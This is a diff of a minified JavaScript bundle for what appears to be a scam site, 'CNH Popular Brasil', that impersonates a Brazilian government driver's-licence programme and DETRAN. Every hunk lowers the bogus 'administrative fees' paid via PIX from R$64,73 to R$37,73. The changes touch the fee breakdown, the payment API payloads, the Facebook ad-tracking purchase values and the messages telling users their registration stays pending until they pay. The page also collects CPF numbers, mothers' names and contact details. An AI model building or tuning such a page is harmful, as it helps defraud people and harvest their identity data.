@@ -20840,7 +20840,7 @@ function gp() {
               body: JSON.stringify({
                 nome: C.nome,
                 cpf: C.cpf,
-                valor: 64.73,
+                valor: 37.73,
                 email: C.email || "",
                 telefone: C.phone || "",
                 detran: j,
@@ -30776,7 +30776,7 @@ function RE() {
                               }),
                               l.jsx("span", {
                                 className: "font-bold whitespace-nowrap",
-                                children: "R$26,13",
+                                children: "R$19,13",
                               }),
                             ],
                           }),
@@ -30792,7 +30792,7 @@ function RE() {
                               }),
                               l.jsx("span", {
                                 className: "font-bold whitespace-nowrap",
-                                children: "R$19,30",
+                                children: "R$9,30",
                               }),
                             ],
                           }),
@@ -30808,7 +30808,7 @@ function RE() {
                               }),
                               l.jsx("span", {
                                 className: "font-bold whitespace-nowrap",
-                                children: "R$19,30",
+                                children: "R$9,30",
                               }),
                             ],
                           }),
@@ -30824,7 +30824,7 @@ function RE() {
                               }),
                               l.jsx("span", {
                                 className: "whitespace-nowrap",
-                                children: "R$64,73",
+                                children: "R$37,73",
                               }),
                             ],
                           }),
@@ -30948,7 +30948,7 @@ function DE() {
               !localStorage.getItem(I) &&
                 typeof window.fbq < "u" &&
                 (window.fbq("track", "Purchase", {
-                  value: (t == null ? void 0 : t.amount) || 64.73,
+                  value: (t == null ? void 0 : t.amount) || 37.73,
                   currency: "BRL",
                   content_name: "Pagamento via PIX - CNH do Brasil",
                   content_type: "product",
@@ -31019,7 +31019,7 @@ function DE() {
           nome_mae: _.nomeMae || "",
           email: _.email || "cliente@cnhpopularbrasil.site",
           phone: _.phone || "11999999999",
-          amount: "64,73",
+          amount: "37,73",
           title: "CNH Popular Brasil",
           uf: detranUf || undefined,
           detran: detranUf ? `DETRAN/${detranUf}` : undefined,
@@ -31054,7 +31054,7 @@ function DE() {
                 });
                 h(P);
                 typeof window.triggerPurchaseOnce === "function" &&
-                  window.triggerPurchaseOnce(64.73, "BRL");
+                  window.triggerPurchaseOnce(37.73, "BRL");
               } catch (P) {
                 console.error("Erro ao gerar QR code:", P);
                 d("Erro ao gerar QR code: " + P.message);
@@ -31069,7 +31069,7 @@ function DE() {
                     : `data:image/png;base64,${$}`;
               h(P);
               typeof window.triggerPurchaseOnce === "function" &&
-                window.triggerPurchaseOnce(64.73, "BRL");
+                window.triggerPurchaseOnce(37.73, "BRL");
             }
           } else if (I.pix_code)
             try {
@@ -31315,7 +31315,7 @@ function DE() {
                                 }),
                                 l.jsx("span", {
                                   className: "font-bold text-green-600",
-                                  children: "R$ 64,73",
+                                  children: "R$ 37,73",
                                 }),
                               ],
                             }),
@@ -31421,7 +31421,7 @@ function DE() {
                                 "R$ ",
                                 ((P = t == null ? void 0 : t.amount) == null
                                   ? void 0
-                                  : P.toFixed(2).replace(".", ",")) || "64,73",
+                                  : P.toFixed(2).replace(".", ",")) || "37,73",
                               ],
                             }),
                             l.jsx("p", {
@@ -31534,7 +31534,7 @@ function DE() {
                                 }),
                                 l.jsx("li", {
                                   children:
-                                    "4. Confirme o pagamento de R$ 64,73",
+                                    "4. Confirme o pagamento de R$ 37,73",
                                 }),
                               ],
                             }),
@@ -32004,7 +32004,7 @@ function OE() {
               ) {
                 const ge = window.fbq;
                 ge("track", "Purchase", {
-                  value: (m == null ? void 0 : m.amount) || 64.73,
+                  value: (m == null ? void 0 : m.amount) || 37.73,
                   currency: "BRL",
                   content_type: "product",
                   content_ids: [B],
@@ -32041,7 +32041,7 @@ function OE() {
             ) {
               const Y = window.fbq;
               Y("track", "Purchase", {
-                value: (m == null ? void 0 : m.amount) || 64.73,
+                value: (m == null ? void 0 : m.amount) || 37.73,
                 currency: "BRL",
                 content_type: "product",
                 content_ids: [m.deposit_id],
@@ -32175,7 +32175,7 @@ function OE() {
     if (!localStorage.getItem(Y) && typeof window.fbq < "u")
       try {
         (window.fbq("track", "AddToCart", {
-          value: 64.73,
+          value: 37.73,
           currency: "BRL",
           content_name: "Taxa DETRAN - CNH do Brasil",
           content_type: "product",
@@ -32243,7 +32243,7 @@ function OE() {
               "Content-Type": "application/json",
             },
             body: JSON.stringify({
-              amount: "64,73",
+              amount: "37,73",
               cpf: ge.cpf,
               nome: ge.nome,
               email: ge.email || "cliente@email.com",
@@ -32278,7 +32278,7 @@ function OE() {
                   : `data:image/png;base64,${bw}`;
             qr.qr_code_image = Gw;
             typeof window.triggerPurchaseOnce === "function" &&
-              window.triggerPurchaseOnce(64.73, "BRL");
+              window.triggerPurchaseOnce(37.73, "BRL");
           }
         }
         if (qr && !qr.qr_code_image && qr.pix_code)
@@ -32433,11 +32433,11 @@ O RENACH (Registro Nacional de Carteira de Habilitação) é o número de identi
         await vw(
           `Prezado(a) ${Z}, seu cadastro encontra-se com status PENDENTE. Para liberação do acesso ao aplicativo de aulas e prosseguimento do processo, é obrigatório o recolhimento das Taxas Administrativas:
 
-• Taxa de Expedição de Documento (TED): R$ 26,13
-• Taxa de Serviços Administrativos (TSA): R$ 19,30
-• Taxa de Processamento Eletrônico (TPE): R$ 19,30
+• Taxa de Expedição de Documento (TED): R$ 19,13
+• Taxa de Serviços Administrativos (TSA): R$ 9,30
+• Taxa de Processamento Eletrônico (TPE): R$ 9,30
 
-Valor Total: R$ 64,73`,
+Valor Total: R$ 37,73`,
           3e3,
         ),
         i("finalize_button"));
@@ -32477,7 +32477,7 @@ Valor Total: R$ 64,73`,
 
 Após a confirmação do pagamento, seu cadastro no Programa CNH do Brasil será ativado e você já poderá iniciar as aulas teóricas pelo aplicativo oficial.
 
-Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão abaixo para ativar seu cadastro.`,
+Assim que realizar o pagamento das taxas no valor de R$ 37,73, clique no botão abaixo para ativar seu cadastro.`,
           !0,
         ),
         i("awaiting_payment"));
@@ -33364,7 +33364,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão 
                                   }),
                                   l.jsx("span", {
                                     className: "font-semibold",
-                                    children: "26,13",
+                                    children: "19,13",
                                   }),
                                 ],
                               }),
@@ -33379,7 +33379,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão 
                                   }),
                                   l.jsx("span", {
                                     className: "font-semibold",
-                                    children: "19,30",
+                                    children: "9,30",
                                   }),
                                 ],
                               }),
@@ -33394,7 +33394,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão 
                                   }),
                                   l.jsx("span", {
                                     className: "font-semibold",
-                                    children: "19,30",
+                                    children: "9,30",
                                   }),
                                 ],
                               }),
@@ -33406,7 +33406,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão 
                                     children: "TOTAL",
                                   }),
                                   l.jsx("span", {
-                                    children: "64,73",
+                                    children: "37,73",
                                   }),
                                 ],
                               }),
@@ -33585,7 +33585,7 @@ Assim que realizar o pagamento das taxas no valor de R$ 64,73, clique no botão 
                                   }),
                                   l.jsx("p", {
                                     className: "font-bold text-lg",
-                                    children: "R$ 64,73",
+                                    children: "R$ 37,73",
                                   }),
                                 ],
                               }),
